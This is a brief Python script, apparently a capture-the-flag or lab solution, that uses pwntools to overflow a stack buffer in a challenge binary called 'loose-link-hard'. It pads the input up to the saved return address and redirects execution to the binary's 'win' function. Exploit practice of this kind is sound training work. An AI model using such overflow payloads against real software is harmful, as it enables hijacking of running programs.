#!/usr/bin/python3


from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/loose-link-hard')

input_start = 0x7ffd559d62d0
rbp = 0x7ffd559d6330
ret = 0x7ffd559d6330 + 0x8
offset = ret - input_start

payload = b"A" * offset +  p64(elf.sym.win)

io = process()

io.send(payload)

io.interactive()
